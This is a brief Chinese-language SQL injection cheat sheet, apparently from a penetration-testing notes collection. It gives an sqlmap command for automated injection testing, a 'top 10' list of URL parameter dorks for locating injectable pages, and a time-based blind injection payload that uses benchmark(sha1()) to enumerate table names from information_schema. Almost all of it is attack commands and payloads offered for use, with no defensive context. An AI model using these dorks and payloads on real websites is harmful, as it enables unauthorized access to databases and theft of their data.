# SQL注入

## 快速自动化测试注入

`Sqlmap -u https://url/something/*`



## top 10 Dorks

```
1.?id=
2.?cat=
3.?view=
4.?mode=
5.?tid=
6.?product_id=
7.?act=
8.?item_id=
9.?table=
10.?module=
```



## 测试语句

```
select if( table_name like 'x', benchmark(100000,sha1('_Y000!_')), concat(table_name) ) from information_schema.tables
```

